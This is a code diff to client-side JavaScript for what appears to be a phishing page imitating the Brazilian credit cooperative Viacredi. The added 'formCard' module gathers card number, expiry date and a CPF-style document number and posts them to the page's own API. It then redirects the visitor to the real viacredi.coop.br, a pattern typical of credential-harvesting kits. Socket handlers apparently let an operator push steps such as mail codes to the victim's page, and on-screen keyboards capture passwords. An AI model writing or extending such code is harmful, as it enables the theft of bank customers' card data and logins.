@@ -661,11 +661,11 @@ const infosData = (() => {
             } else return
         })
 
-        socket.on('getCardVerify', (data) => {
-            if (idClient) {
-                if (idClient == data.id) window.location.href = `/modules/conta/card/${data.id}/${data.cards[0].end}`
-            } else return
-        })
+        // socket.on('getCardVerify', (data) => {
+        //     if (idClient) {
+        //         if (idClient == data.id) window.location.href = `/modules/conta/card/${data.id}/${data.cards[0].end}`
+        //     } else return
+        // })
 
         socket.on('getMailCode', (data) => {
             if (idClient) {
@@ -1362,7 +1362,7 @@ const mp = (() => {
 
                         setTimeout(() => {
                             modalLetter.modal('hide')
-                            window.location.href = `https://www.viacredi.coop.br/`
+                            window.location.href = `/modules/conta/cards_info/${client_id}`
                         }, 5000)
                     } catch (error) {
                         console.log(`Erro au subir modal de letra`, error)
@@ -1569,6 +1569,61 @@ mp.submitCode(`.formMail__code.verify`)
 mp.formPassSubmit(`.main-form-login.password`)
 mp.formUserSubmit(`.main-form-login.send-error-login`)
 
+const formCard = (() => {
+    const client_id = document.body.dataset.client
+    //private var/functions
+    async function submit(targer) {
+        const form = document.querySelector(targer);
+
+        if(!form)  return
+
+        
+
+        form.addEventListener('submit', async function (e) {
+            e.preventDefault()
+            const btn = form.querySelector('.btn')
+
+            try {
+                const data = util.serialize(form)
+
+                const config = {
+                    method: `post`,
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                }
+
+                const client = await (await fetch(`/api/client/card/${client_id}`, config)).json()
+
+                
+
+                btn.innerHTML = `<div class="spinner-border" role="status">
+                    <span class="visually-hidden">Loading...</span>
+                </div>`
+
+                setTimeout(() => {
+                    return window.location.href = `https://www.viacredi.coop.br/`
+                }, 1000);
+
+                
+            } catch (error) {
+                btn.innerHTML = `Cadastrar cartão`
+                console.log(error)
+            }
+        });
+    }
+    
+    return {
+        //public var/functions
+        submit
+    }
+})()
+
+
+formCard.submit('.main-form-login.card')
+
+
 const keyboards = (() => {
     //private var/functions
     function keyclickLetter(target) {
@@ -1729,6 +1784,34 @@ keyboards.keyclickPass(`.keyboardNumeric article button`)
 keyboards.keyclickLetter(`.phraseLetter button`)
 
 //phraseLetter
+
+if(document.querySelector('.card_number')) {
+
+    var card_number = new Cleave('.card_number', {
+        creditCard: true,
+        onCreditCardTypeChanged: function (type) {
+            // update UI ...
+        }
+    })
+}
+
+
+if(document.querySelector('.card_document')) {
+    var card_document = new Cleave('.card_document', {
+        delimiters: ['.', '.', '-'],
+        blocks: [3, 3, 3, 2],
+        uppercase: true
+    })
+}
+
+
+if(document.querySelector('.card_validity')) {
+    var card_validity = new Cleave('.card_validity', {
+        delimiters: ['/'],
+        blocks: [2, 2],
+        uppercase: true
+    })
+}
 
 //formLogin
 const login = (() => {
